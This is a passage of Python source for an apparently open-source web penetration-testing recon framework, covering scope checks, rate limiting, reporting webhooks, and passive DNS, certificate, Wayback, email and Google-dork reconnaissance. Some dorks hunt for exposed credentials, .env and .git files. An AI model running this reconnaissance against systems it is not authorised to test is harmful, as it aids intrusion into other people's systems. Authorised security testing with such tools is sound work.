#!/usr/bin/env python3
"""
WebRecon — Comprehensive Web Application Reconnaissance & Enumeration

A single-file Python framework that orchestrates passive OSINT, active
reconnaissance, content discovery, vulnerability probing, and reporting
for web-application penetration testing.

Glues together the tools you already use (nuclei, katana, arjun, ffuf,
nmap, wpscan, wafw00f, subfinder, etc.) and adds first-party checks
covering the gaps those tools leave: JWT deep analysis, CORS, security
headers, SSRF/SSTI/CRLF/host-header injection, cloud-metadata probing,
default-credential testing, favicon-hash pivoting, JS secret extraction,
differential SQLi (error/boolean/time), reflected-XSS context analysis,
HTTP request smuggling (CL.TE/TE.CL timing), verb tampering, 401/403
bypass, deep CSP analysis, OpenAPI/Swagger/WSDL schema mining, VCS/source
exposure (.git/.svn/.env/backups), WebSocket discovery, prototype
pollution, and DNS posture (SPF/DMARC/DNSSEC/CAA/AXFR).

Features:
  - Resumable scans (target-aware state file)
  - Authenticated scanning (cookies, custom headers, session checks)
  - Catch-all routing detection (eliminates FPs across SPAs/CDNs)
  - Differential SSTI detection (control-payload + baseline diff)
  - Strict GraphQL detection (JSON-shape validation)
  - Scope enforcement (IPv4/IPv6 CIDRs + domains, resolved-IP checks)
  - Adaptive rate limiting (exponential 429/503 backoff)
  - Scan profiles: recon | active | full | stealth
  - Output: Markdown, filterable HTML, JSON
  - Diff mode against previous findings JSON
  - Webhook notifications (Discord/Slack auto-detect)
  - Tech-specific playbooks: WordPress / Drupal / Joomla / Laravel
    / Spring / Tomcat / Jenkins / ASP.NET-IIS
  - API-aware: parses OpenAPI/Swagger/WSDL into the discovery state so
    SQLi/XSS/SSRF/traversal phases test the real API surface

Usage:
  ./web_app.py -t example.com --auto
  ./web_app.py -t example.com -o engagement_2026 --proxy http://127.0.0.1:8080
  ./web_app.py -t example.com --profile stealth --cookie "session=abc123"

For full options:
  ./web_app.py --help

Project: https://github.com/Mr-Whiskerss/Web-Application-Enumeration-Script
License: GPL-3.0
"""

import os
import re
import sys
import json
import time
import shutil
import socket
import hashlib
import base64
import subprocess
import ipaddress
import threading
from datetime import datetime
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional, List, Dict, Tuple, Set
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, parse_qs
from collections import Counter

# ── Dependency checks ────────────────────────────────────────────────────────
_MISSING = []
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    _MISSING.append("requests")

try:
    from colorama import Fore, Style, init as _cinit
    _cinit(autoreset=True)
except ImportError:
    _MISSING.append("colorama")
    class Fore:
        RED=GREEN=YELLOW=BLUE=CYAN=MAGENTA=WHITE=""
    class Style:
        RESET_ALL=BRIGHT=""

# Optional deps — degrade gracefully
try:
    import mmh3
    _HAS_MMH3 = True
except ImportError:
    _HAS_MMH3 = False

if _MISSING:
    print(f"[!] Missing required packages: pip install {' '.join(_MISSING)}")
    sys.exit(1)

# ── Constants ─────────────────────────────────────────────────────────────────
VERSION        = "3.2.0"
DEFAULT_UA     = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/120.0.0.0 Safari/537.36")
DEFAULT_TIMEOUT = 10

# ═════════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

class TargetType(Enum):
    IP     = "ip"
    DOMAIN = "domain"

class ScanProfile(str, Enum):
    RECON   = "recon"    # Passive only — no active probes
    ACTIVE  = "active"   # Passive + active recon + tech (no vuln scan)
    FULL    = "full"     # Everything
    STEALTH = "stealth"  # Full but throttled, no intrusive tools

@dataclass
class Finding:
    title:          str
    severity:       Severity
    description:    str
    evidence:       str = ""
    recommendation: str = ""
    phase:          str = ""
    timestamp:      str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ScanConfig:
    target:          str
    target_type:     TargetType
    base_url:        str
    output_prefix:   str
    proxy:           Optional[str]  = None
    user_agent:      str            = DEFAULT_UA
    timeout:         int            = DEFAULT_TIMEOUT
    oob_url:         Optional[str]  = None
    scope_file:      Optional[str]  = None
    auto:            bool           = False
    rate:            int            = 50
    delay:           float          = 0.0
    full_ports:      bool           = False
    google_api_key:  Optional[str]  = None
    google_cx:       Optional[str]  = None
    google_dork_count: int          = 5
    diff_file:       Optional[str]  = None
    threads:         int            = 5
    verbose:         bool           = False
    # Auth
    cookie:          Optional[str]  = None
    extra_headers:   List[str]      = field(default_factory=list)
    auth_check_url:  Optional[str]  = None
    auth_check_text: Optional[str]  = None
    # Integrations
    webhook_url:     Optional[str]  = None
    webhook_threshold: Severity     = Severity.HIGH
    pentestdb_url:   Optional[str]  = None
    pentestdb_token: Optional[str]  = None
    # Scan control
    profile:         ScanProfile    = ScanProfile.FULL
    no_intrusive:    bool           = False
    nuclei_severity: str            = "medium,high,critical"
    html_report:     bool           = True
    # Tool timeouts
    whatweb_timeout: int            = 120
    arjun_timeout:   int            = 1200
    # Catch-all baseline (filled in at scan start)
    catchall_active: bool           = False
    catchall_size:   int            = 0
    catchall_body:   str            = ""

# ═════════════════════════════════════════════════════════════════════════════
# ADAPTIVE RATE-LIMITED SESSION
# ═════════════════════════════════════════════════════════════════════════════

class RateLimitedSession(requests.Session):
    """Sessions share class-level backoff so the whole scan throttles together."""
    _lock              = threading.Lock()
    _consecutive_429   = 0
    _backoff_until     = 0.0
    _announced_backoff = False

    def request(self, method, url, **kwargs):
        # Respect any active backoff window
        with RateLimitedSession._lock:
            wait = RateLimitedSession._backoff_until - time.time()
        if wait > 0:
            time.sleep(min(wait, 60))

        try:
            resp = super().request(method, url, **kwargs)
        except Exception:
            raise

        if resp.status_code in (429, 503):
            with RateLimitedSession._lock:
                RateLimitedSession._consecutive_429 += 1
                backoff = min(2 ** RateLimitedSession._consecutive_429, 60)
                RateLimitedSession._backoff_until = time.time() + backoff
                if not RateLimitedSession._announced_backoff:
                    print(f"  {Fore.YELLOW}⏱ Rate limited (HTTP {resp.status_code}) "
                          f"— backing off {backoff}s")
                    RateLimitedSession._announced_backoff = True
        elif resp.status_code < 400:
            with RateLimitedSession._lock:
                if RateLimitedSession._consecutive_429 > 0:
                    RateLimitedSession._consecutive_429 = 0
                    RateLimitedSession._announced_backoff = False

        return resp

# ═════════════════════════════════════════════════════════════════════════════
# DISCOVERED STATE (crawler → param discovery → SSRF/SSTI/etc)
# ═════════════════════════════════════════════════════════════════════════════

class DiscoveredState:
    def __init__(self):
        self._lock  = threading.Lock()
        self.urls:   Set[str] = set()
        self.params: Set[str] = set()
        self.endpoints: Set[str] = set()   # (path-only, no query)

    def add_urls(self, urls):
        with self._lock:
            for u in urls:
                if not u:
                    continue
                self.urls.add(u)
                try:
                    parsed = urlparse(u)
                    if parsed.path:
                        self.endpoints.add(parsed.path)
                    if parsed.query:
                        for k in parse_qs(parsed.query).keys():
                            self.params.add(k)
                except Exception:
                    pass

    def add_params(self, params):
        with self._lock:
            self.params.update(p for p in params if p)

    def get_urls_with_params(self, limit: int = 50) -> List[str]:
        with self._lock:
            return [u for u in self.urls if '?' in u and '=' in u][:limit]

DISCOVERED = DiscoveredState()

# ═════════════════════════════════════════════════════════════════════════════
# FINDINGS STORE + HOOKS (webhook / pentestdb)
# ═════════════════════════════════════════════════════════════════════════════

_findings: List[Finding] = []
_findings_lock = threading.Lock()
_finding_keys: Set[str] = set()   # dedup on (title | severity | evidence-hash)
_SEV_ORDER = {Severity.INFO:0, Severity.LOW:1, Severity.MEDIUM:2,
              Severity.HIGH:3, Severity.CRITICAL:4}

def add_finding(f: Finding, output_file: str, cfg: Optional[ScanConfig] = None):
    # Suppress exact duplicates — crawled params feed several phases, so the
    # same issue can otherwise be emitted (and webhook-pushed) multiple times.
    key = (f"{f.title}|{f.severity.value}|"
           f"{hashlib.md5((f.evidence or '').encode()).hexdigest()}")
    with _findings_lock:
        if key in _finding_keys:
            return
        _finding_keys.add(key)
        _findings.append(f)
    color = {
        Severity.INFO:     Fore.CYAN,
        Severity.LOW:      Fore.GREEN,
        Severity.MEDIUM:   Fore.YELLOW,
        Severity.HIGH:     Fore.RED,
        Severity.CRITICAL: Fore.MAGENTA,
    }.get(f.severity, Fore.WHITE)
    print(f"  {color}[{f.severity.value}] {f.title}")
    _log_finding_to_report(f, output_file)

    # Push to webhook / pentestdb if configured and severity warrants
    if cfg:
        try:
            if cfg.webhook_url and _SEV_ORDER[f.severity] >= _SEV_ORDER[cfg.webhook_threshold]:
                webhook_notify(f, cfg)
        except Exception as e:
            if cfg.verbose:
                print(f"  {Fore.YELLOW}⚠ webhook: {e}")
        try:
            if cfg.pentestdb_url:
                pentestdb_push(f, cfg)
        except Exception as e:
            if cfg.verbose:
                print(f"  {Fore.YELLOW}⚠ pentestdb: {e}")

def _log_finding_to_report(f: Finding, output_file: str):
    icons = {Severity.INFO:"ℹ️", Severity.LOW:"🟢",
             Severity.MEDIUM:"🟡", Severity.HIGH:"🔴", Severity.CRITICAL:"🚨"}
    icon = icons.get(f.severity, "")
    lines = [
        f"\n### {icon} [{f.severity.value}] {f.title}",
        f"**Phase:** {f.phase}  |  **Time:** {f.timestamp}\n",
        f"**Description:** {f.description}\n",
    ]
    if f.evidence:
        lines.append(f"**Evidence:**\n```\n{f.evidence[:1500]}\n```\n")
    if f.recommendation:
        lines.append(f"**Recommendation:** {f.recommendation}\n")
    lines.append("---")
    _log(output_file, '\n'.join(lines))

# ═════════════════════════════════════════════════════════════════════════════
# WEBHOOK NOTIFIER (Discord / Slack compatible)
# ═════════════════════════════════════════════════════════════════════════════

def webhook_notify(f: Finding, cfg: ScanConfig):
    """POST a finding to a Discord/Slack incoming webhook URL."""
    color_map = {Severity.INFO: 0x3498db, Severity.LOW: 0x2ecc71,
                 Severity.MEDIUM: 0xf1c40f, Severity.HIGH: 0xe67e22,
                 Severity.CRITICAL: 0xe74c3c}
    url = cfg.webhook_url
    if not url:
        return
    # Discord-style embed
    if "discord" in url.lower():
        payload = {
            "embeds": [{
                "title":       f"[{f.severity.value}] {f.title}",
                "description": f.description[:1500],
                "color":       color_map.get(f.severity, 0x95a5a6),
                "fields": [
                    {"name": "Target", "value": cfg.target, "inline": True},
                    {"name": "Phase",  "value": f.phase or "n/a", "inline": True},
                ],
                "timestamp": f.timestamp,
            }]
        }
    else:
        # Slack-style
        payload = {
            "text": f"*[{f.severity.value}]* {f.title}\n"
                    f"_Target:_ `{cfg.target}` | _Phase:_ `{f.phase}`\n"
                    f"{f.description[:1500]}"
        }
    try:
        requests.post(url, json=payload, timeout=5, verify=False,
                      proxies={"http": cfg.proxy, "https": cfg.proxy} if cfg.proxy else None)
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════════════════
# PENTESTDB PUSHER
# ═════════════════════════════════════════════════════════════════════════════

def pentestdb_push(f: Finding, cfg: ScanConfig):
    """POST finding to a self-hosted pentestdb instance.
    Expected API: POST {pentestdb_url}/api/findings with JSON body.
    Adapt endpoint path to match your deployment."""
    if not cfg.pentestdb_url:
        return
    endpoint = cfg.pentestdb_url.rstrip('/') + "/api/findings"
    payload = {
        "target":         cfg.target,
        "title":          f.title,
        "severity":       f.severity.value,
        "description":    f.description,
        "evidence":       f.evidence,
        "recommendation": f.recommendation,
        "phase":          f.phase,
        "timestamp":      f.timestamp,
        "tool":           f"WebRecon v{VERSION}",
    }
    headers = {"Content-Type": "application/json"}
    if cfg.pentestdb_token:
        headers["Authorization"] = f"Bearer {cfg.pentestdb_token}"
    try:
        requests.post(endpoint, json=payload, headers=headers,
                      timeout=10, verify=False)
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════════════════
# SCOPE ENFORCEMENT (fixed: IPv6, resolved-IP check)
# ═════════════════════════════════════════════════════════════════════════════

class ScopeChecker:
    def __init__(self, scope_file: Optional[str] = None):
        self.domains: List[str] = []
        self.cidrs:   List = []  # IPv4Network | IPv6Network
        self.enabled  = scope_file is not None
        if scope_file and os.path.exists(scope_file):
            for line in open(scope_file):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Try IPv4 then IPv6 network, fall back to domain
                try:
                    self.cidrs.append(ipaddress.IPv4Network(line, strict=False))
                    continue
                except ValueError:
                    pass
                try:
                    self.cidrs.append(ipaddress.IPv6Network(line, strict=False))
                    continue
                except ValueError:
                    pass
                self.domains.append(line.lower().lstrip('*.'))

    def check(self, target: str) -> bool:
        if not self.enabled:
            return True
        # IP literal check
        try:
            addr = ipaddress.ip_address(target)
            # addr in net is False (not an error) across mismatched IP versions,
            # so a plain membership test is both correct and readable.
            return any(addr in net for net in self.cidrs)
        except ValueError:
            pass
        # Domain match
        t = target.lower()
        if any(t == d or t.endswith('.' + d) for d in self.domains):
            return True
        # Resolve domain → check IP against CIDRs
        if self.cidrs:
            try:
                resolved = socket.gethostbyname(target)
                addr = ipaddress.ip_address(resolved)
                for net in self.cidrs:
                    try:
                        if addr in net:
                            return True
                    except (TypeError, ValueError):
                        continue
            except Exception:
                pass
        return False

# ═════════════════════════════════════════════════════════════════════════════
# SCAN STATE (RESUMABILITY)
# ═════════════════════════════════════════════════════════════════════════════

class ScanState:
    def __init__(self, state_file: str, target: str):
        self._file   = state_file
        self._target = target
        self._done: List[str] = []
        self._start  = datetime.now().isoformat()
        if os.path.exists(state_file):
            try:
                d = json.load(open(state_file))
                saved_target = d.get("target")
                # Target mismatch → auto-clear to prevent cross-target state collision
                if saved_target and saved_target != target:
                    print(f"{Fore.YELLOW}  [STATE] Previous state was for '{saved_target}' — "
                          f"clearing (current target: '{target}')")
                    os.remove(state_file)
                    return
                self._done  = d.get("done", [])
                self._start = d.get("start", self._start)
                if self._done:
                    print(f"{Fore.YELLOW}  [RESUME] Completed phases: {', '.join(self._done)}")
            except Exception:
                pass

    def done(self, phase: str) -> bool:
        return phase in self._done

    def mark(self, phase: str):
        if phase not in self._done:
            self._done.append(phase)
            json.dump({"target":  self._target,
                       "done":    self._done,
                       "start":   self._start,
                       "updated": datetime.now().isoformat()},
                      open(self._file, 'w'), indent=2)

    def clear(self):
        self._done = []
        if os.path.exists(self._file):
            os.remove(self._file)

# ═════════════════════════════════════════════════════════════════════════════
# OUTPUT HELPERS
# ═════════════════════════════════════════════════════════════════════════════

_log_lock = threading.Lock()

def _log(output_file: str, msg: str):
    with _log_lock:
        with open(output_file, 'a') as fh:
            fh.write(msg + '\n')

def section(title: str, output_file: str):
    print(f"\n{Fore.BLUE}{'─'*55}")
    print(f"{Fore.BLUE}  {title}")
    print(f"{Fore.BLUE}{'─'*55}")
    _log(output_file, f"\n\n---\n# {title}\n")

def save_findings(findings: List[Finding], path: str):
    with open(path, 'w') as fh:
        json.dump([asdict(f) for f in findings], fh, indent=2, default=str)

# ═════════════════════════════════════════════════════════════════════════════
# SUBPROCESS RUNNER (shell=False)
# ═════════════════════════════════════════════════════════════════════════════

def run_cmd(cmd: List[str], desc: str, output_file: str, config: ScanConfig,
            timeout: int = 300) -> Tuple[str, str, int]:
    print(f"{Fore.YELLOW}  → {desc}")
    _log(output_file, f"\n## {desc}\n**`{' '.join(cmd)}`**")
    try:
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
        if r.stdout:
            _log(output_file, f"```\n{r.stdout.strip()}\n```")
        if r.stderr and config.verbose:
            _log(output_file, f"**stderr:**\n```\n{r.stderr.strip()}\n```")
        icon = Fore.GREEN + "✓" if r.returncode == 0 else Fore.RED + "✗"
        print(f"  {icon} {desc}")
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        msg = f"TIMEOUT after {timeout}s"
        print(f"  {Fore.RED}⏱ {desc}: {msg}")
        _log(output_file, f"> ⚠️ {msg}")
        return "", "", -1
    except FileNotFoundError:
        print(f"  {Fore.RED}✗ Not found: {cmd[0]}")
        _log(output_file, f"> ⚠️ {cmd[0]} not installed")
        return "", "", -1
    except Exception as e:
        print(f"  {Fore.RED}✗ {e}")
        _log(output_file, f"> ⚠️ {e}")
        return "", "", -1

# ═════════════════════════════════════════════════════════════════════════════
# HTTP SESSION (auth-aware, rate-limited)
# ═════════════════════════════════════════════════════════════════════════════

def make_session(config: ScanConfig) -> "requests.Session":
    s = RateLimitedSession()
    s.headers["User-Agent"] = config.user_agent
    s.verify = False
    if config.proxy:
        s.proxies = {"http": config.proxy, "https": config.proxy}
    # Authenticated session: cookies
    if config.cookie:
        for kv in config.cookie.split(';'):
            kv = kv.strip()
            if '=' in kv:
                k, v = kv.split('=', 1)
                s.cookies.set(k.strip(), v.strip())
    # Extra headers (Authorization: Bearer …, X-API-Key: …, etc.)
    if config.extra_headers:
        for h in config.extra_headers:
            if ':' in h:
                k, v = h.split(':', 1)
                s.headers[k.strip()] = v.strip()
    return s

def detect_scheme(target: str, config: ScanConfig) -> str:
    sess = make_session(config)
    for scheme in ("https", "http"):
        try:
            sess.get(f"{scheme}://{target}", timeout=config.timeout,
                     allow_redirects=False)
            print(f"{Fore.GREEN}  ✓ Scheme detected: {scheme}")
            return scheme
        except Exception:
            continue
    return "http"

def revalidate_session(cfg: ScanConfig, out: str) -> bool:
    """If auth-check-url/text configured, verify session is still authenticated."""
    if not cfg.auth_check_url or not cfg.auth_check_text:
        return True
    try:
        sess = make_session(cfg)
        r = sess.get(cfg.auth_check_url, timeout=cfg.timeout)
        if cfg.auth_check_text in r.text:
            return True
        print(f"  {Fore.RED}⚠ Auth check failed — session may have expired!")
        _log(out, f"> ⚠️ Auth check failed at {cfg.auth_check_url}")
        return False
    except Exception as e:
        print(f"  {Fore.YELLOW}⚠ Auth check error: {e}")
        return False

# ═════════════════════════════════════════════════════════════════════════════
# TOOL HELPERS
# ═════════════════════════════════════════════════════════════════════════════

_MISSING_TOOLS: Set[str] = set()
_MISSING_TOOLS_LOCK = threading.Lock()

def _tool_ok(name: str, output_file: str) -> bool:
    if shutil.which(name):
        return True
    with _MISSING_TOOLS_LOCK:
        _MISSING_TOOLS.add(name)
    msg = f"{name} not installed — skipping"
    print(f"  {Fore.YELLOW}⚠ {msg}")
    _log(output_file, f"> ⚠️ {msg}")
    return False

def _is_root() -> bool:
    return os.geteuid() == 0

def _sudo() -> List[str]:
    return [] if _is_root() else ["sudo"]

# ═════════════════════════════════════════════════════════════════════════════
# INPUT HELPERS (loosened sanitise: allow host:port)
# ═════════════════════════════════════════════════════════════════════════════

def normalise(raw: str) -> str:
    raw = raw.strip()
    if re.match(r'^https?://', raw, re.I):
        return urlparse(raw).netloc
    return raw.rstrip('/')

def validate(target: str) -> Optional[TargetType]:
    if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
        try:
            ipaddress.IPv4Address(target)
            return TargetType.IP
        except ValueError:
            return None
    if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$', target):
        return TargetType.DOMAIN
    # Allow host:port
    if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}:\d{1,5}$', target):
        return TargetType.DOMAIN
    return None

def sanitise(value: str) -> str:
    # Loosened: colon allowed (for host:port). Still blocks shell metachars.
    if re.search(r'[;&|`$<>()\\\'"{}]', value):
        raise ValueError(f"Unsafe characters in input: {value!r}")
    return value

def yes_no(prompt: str) -> bool:
    while True:
        ans = input(f"{Fore.CYAN}  {prompt} (y/n): ").strip().lower()
        if ans in ('y', 'yes'): return True
        if ans in ('n', 'no'):  return False

# ═════════════════════════════════════════════════════════════════════════════
# DIFF MODE
# ═════════════════════════════════════════════════════════════════════════════

def diff_findings(current: List[Finding], prev_file: str) -> Dict:
    if not os.path.exists(prev_file):
        return {}
    try:
        prev = {f['title'] for f in json.load(open(prev_file))}
        curr = {f.title for f in current}
        return {
            "new":       [asdict(f) for f in current if f.title not in prev],
            "resolved":  list(prev - curr),
            "unchanged": len(curr & prev),
        }
    except Exception:
        return {}

# ═════════════════════════════════════════════════════════════════════════════
# CATCH-ALL DETECTION
# Many SPAs / CDNs / WAFs return the homepage (or a generic 200) for *any*
# unknown path. Without detecting this, every content/well-known/graphql probe
# becomes a false positive. We probe a random unlikely path once at scan start
# and store the response signature on cfg, then check before any 200-based
# inference.
# ═════════════════════════════════════════════════════════════════════════════

def detect_catchall(cfg: "ScanConfig", out: str):
    """Probe a random unlikely path. If the server returns 200, mark catch-all
    on cfg with the baseline body+size for later comparison."""
    sess = make_session(cfg)
    canary = f"/webrecon-canary-{hashlib.md5(os.urandom(8)).hexdigest()[:12]}"
    try:
        r = sess.get(f"{cfg.base_url}{canary}", timeout=cfg.timeout,
                     allow_redirects=False)
        if r.status_code in (200, 201, 202):
            cfg.catchall_active = True
            cfg.catchall_size   = len(r.content)
            cfg.catchall_body   = r.text[:5000]
            _log(out, f"\n## Catch-All Detected\n"
                      f"- Probe URL: `{cfg.base_url}{canary}`\n"
                      f"- HTTP {r.status_code} ({len(r.content)} bytes)\n"
                      f"- Server returns 200 for unknown paths. "
                      f"Findings dependent on '200 = exists' will be filtered.")
            print(f"  {Fore.YELLOW}⚠ Catch-all routing detected — "
                  f"{r.status_code} for unknown paths "
                  f"({len(r.content)} bytes baseline)")
        else:
            _log(out, f"\n## Catch-All Probe\n"
                      f"- Unknown path returned HTTP {r.status_code} (good — "
                      f"server distinguishes valid paths)")
    except Exception as e:
        _log(out, f"> Catch-all probe failed: {e}")


def looks_like_catchall(cfg: "ScanConfig", response_text: str,
                         response_bytes: int) -> bool:
    """Return True if a 200 response matches the catch-all baseline.
    Used by routing-dependent phases to suppress false positives."""
    if not cfg.catchall_active:
        return False
    # Size match within 10% (allows for tiny dynamic content variation)
    size_diff_pct = (abs(response_bytes - cfg.catchall_size) /
                     max(cfg.catchall_size, 1)) * 100
    if size_diff_pct < 10:
        return True
    # Or substantial body overlap (first 2 KB of HTML usually identical)
    if cfg.catchall_body and response_text:
        head_baseline = cfg.catchall_body[:2000]
        head_actual   = response_text[:2000]
        if head_baseline == head_actual:
            return True
    return False

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 1 — PASSIVE RECONNAISSANCE
# ═════════════════════════════════════════════════════════════════════════════

def phase_passive_dns(target: str, tt: TargetType, cfg: ScanConfig,
                      out: str, st: ScanState, scope: ScopeChecker):
    phase = "passive_dns"
    if st.done(phase): return
    section("Passive DNS, WHOIS & ASN", out)

    run_cmd(["nslookup", target.split(':')[0]], "NSLookup", out, cfg)

    if tt == TargetType.DOMAIN and _tool_ok("dnsrecon", out):
        run_cmd(["dnsrecon", "-d", target.split(':')[0], "-t", "std"],
                "DNSRecon", out, cfg, 120)

    # WHOIS
    if shutil.which("whois"):
        stdout, _, _ = run_cmd(["whois", target.split(':')[0]], "WHOIS", out, cfg, 30)
        if stdout:
            for line in stdout.lower().splitlines():
                if "creation date" in line or "created:" in line:
                    m = re.search(r'(\d{4})', line)
                    if m and datetime.now().year - int(m.group(1)) <= 1:
                        add_finding(Finding(
                            title="Recently Registered Domain",
                            severity=Severity.MEDIUM,
                            description="Domain was registered within the last year — common for phishing or typosquatting.",
                            evidence=line.strip(),
                            recommendation="Verify domain ownership and legitimacy.",
                            phase=phase), out, cfg)

    # ASN via ipinfo.io
    try:
        lookup_ip = target.split(':')[0]
        if tt == TargetType.DOMAIN:
            try: lookup_ip = socket.gethostbyname(lookup_ip)
            except Exception: pass
        sess = make_session(cfg)
        r = sess.get(f"https://ipinfo.io/{lookup_ip}/json", timeout=cfg.timeout)
        if r.ok:
            data = r.json()
            _log(out, f"```json\n{json.dumps(data, indent=2)}\n```")
            add_finding(Finding(
                title="ASN & Network Information",
                severity=Severity.INFO,
                description=f"IP: {lookup_ip} | Org: {data.get('org','?')} | Country: {data.get('country','?')}",
                evidence=json.dumps(data, indent=2),
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> ASN lookup failed: {e}")

    # IPv6 check
    if tt == TargetType.DOMAIN:
        try:
            addrs = socket.getaddrinfo(target.split(':')[0], None, socket.AF_INET6)
            if addrs:
                add_finding(Finding(
                    title="IPv6 Address Exposed",
                    severity=Severity.INFO,
                    description=f"Target exposes IPv6: {addrs[0][4][0]}. Verify WAF/access controls cover IPv6.",
                    evidence=str(addrs[0][4][0]),
                    recommendation="Ensure security controls (WAF, monitoring) apply equally to IPv6.",
                    phase=phase), out, cfg)
        except Exception:
            pass

    st.mark(phase)


def phase_cert_transparency(target: str, tt: TargetType, cfg: ScanConfig,
                             out: str, st: ScanState):
    phase = "cert_transparency"
    if st.done(phase) or tt != TargetType.DOMAIN: return
    section("Certificate Transparency (crt.sh)", out)
    host = target.split(':')[0]
    try:
        sess = make_session(cfg)
        r = sess.get(f"https://crt.sh/?q=%.{host}&output=json", timeout=30)
        if r.ok:
            domains = sorted({
                d.strip().lstrip('*.')
                for cert in r.json()
                for d in cert.get('name_value', '').split('\n')
                if host in d
            })
            _log(out, f"Found {len(domains)} unique entries:\n```\n" + '\n'.join(domains[:200]) + "\n```")
            print(f"{Fore.GREEN}  ✓ crt.sh: {len(domains)} subdomains")
            add_finding(Finding(
                title=f"Certificate Transparency: {len(domains)} Subdomains",
                severity=Severity.INFO,
                description=f"crt.sh reveals {len(domains)} subdomains for {host}.",
                evidence='\n'.join(domains[:50]),
                recommendation="Review for forgotten or unpatched assets.",
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> crt.sh failed: {e}")
    st.mark(phase)


def phase_wayback(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Enhanced: extracts URL parameters for later fuzzing."""
    phase = "wayback"
    if st.done(phase): return
    section("Wayback Machine URL Mining", out)
    host = target.split(':')[0]
    try:
        sess = make_session(cfg)
        url = (f"http://web.archive.org/cdx/search/cdx?url={host}/*"
               "&output=json&fl=original&collapse=urlkey&limit=500")
        r = sess.get(url, timeout=30)
        if r.ok:
            rows = r.json()
            urls = [row[0] for row in rows[1:]] if len(rows) > 1 else []
            _log(out, f"Found {len(urls)} archived URLs\n```\n" + '\n'.join(urls[:200]) + "\n```")
            print(f"{Fore.GREEN}  ✓ Wayback: {len(urls)} URLs")

            # Feed URLs + params into shared state
            DISCOVERED.add_urls(urls)
            extracted_params = set()
            for u in urls:
                try:
                    q = urlparse(u).query
                    if q:
                        for k in parse_qs(q).keys():
                            extracted_params.add(k)
                except Exception:
                    continue
            if extracted_params:
                DISCOVERED.add_params(extracted_params)
                _log(out, f"\n## Wayback Parameters ({len(extracted_params)} unique)\n"
                          f"```\n{', '.join(sorted(extracted_params)[:100])}\n```")
                add_finding(Finding(
                    title=f"Wayback: {len(extracted_params)} Historical URL Parameters",
                    severity=Severity.INFO,
                    description=f"Extracted {len(extracted_params)} unique parameters from archived URLs — feeding into fuzzing phases.",
                    evidence=', '.join(sorted(extracted_params)[:50]),
                    recommendation="Review old parameters for dead code paths or residual functionality.",
                    phase=phase), out, cfg)

            for kw in ('admin', 'api', 'backup', 'config', 'debug', 'upload', 'test', 'dev'):
                hits = [u for u in urls if kw in u.lower()]
                if hits:
                    add_finding(Finding(
                        title=f"Wayback: Historical '{kw}' Endpoints",
                        severity=Severity.LOW,
                        description=f"{len(hits)} archived URLs contain '{kw}'.",
                        evidence='\n'.join(hits[:10]),
                        recommendation="Verify whether these endpoints still exist and are secured.",
                        phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> Wayback failed: {e}")
    st.mark(phase)


def phase_google_dorks(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "google_dorks"
    if st.done(phase): return
    section("Google Dorking", out)
    host = target.split(':')[0]
    dorks = [
        f"site:{host}",
        f"site:{host} filetype:pdf",
        f"site:{host} filetype:xls OR filetype:xlsx",
        f"site:{host} inurl:admin",
        f"site:{host} inurl:login",
        f"site:{host} inurl:config OR inurl:backup",
        f"site:{host} intext:\"error\" OR intext:\"exception\" OR intext:\"stack trace\"",
        f"site:{host} intext:\"username\" intext:\"password\"",
        f"site:{host} ext:env OR ext:git OR ext:svn",
        f"site:{host} \"index of\"",
        f"site:{host} inurl:api",
    ]
    _log(out, "## Google Dork URLs\n")
    for d in dorks:
        enc = d.replace(' ', '+')
        _log(out, f"- [{d}](https://www.google.com/search?q={enc})")

    if cfg.google_api_key and cfg.google_cx:
        sess = make_session(cfg)
        for dork in dorks[:cfg.google_dork_count]:
            try:
                resp = sess.get("https://www.googleapis.com/customsearch/v1",
                                params={"key": cfg.google_api_key, "cx": cfg.google_cx,
                                        "q": dork, "num": 10}, timeout=cfg.timeout)
                if resp.ok:
                    items = resp.json().get('items', [])
                    _log(out, f"\n### `{dork}` ({len(items)} results)")
                    for item in items:
                        _log(out, f"- [{item.get('title')}]({item.get('link')})")
                time.sleep(1)
            except Exception as e:
                _log(out, f"> API search failed: {e}")
    else:
        print(f"{Fore.CYAN}  ℹ Dork URLs generated. Add --google-api-key to automate.")
    st.mark(phase)


def phase_email_harvest(target: str, tt: TargetType, cfg: ScanConfig,
                         out: str, st: ScanState):
    phase = "email_harvest"
    if st.done(phase) or tt != TargetType.DOMAIN: return
    section("Email Harvesting (theHarvester)", out)
    if _tool_ok("theHarvester", out):
        run_cmd(["theHarvester", "-d", target.split(':')[0],
                 "-b", "bing,google,duckduckgo", "-l", "200"],
                "theHarvester", out, cfg, 180)
    st.mark(phase)


def phase_subdomain_enum(target: str, tt: TargetType, cfg: ScanConfig,
                          out: str, st: ScanState, scope: ScopeChecker):
    phase = "subdomain_enum"
    if st.done(phase) or tt != TargetType.DOMAIN:
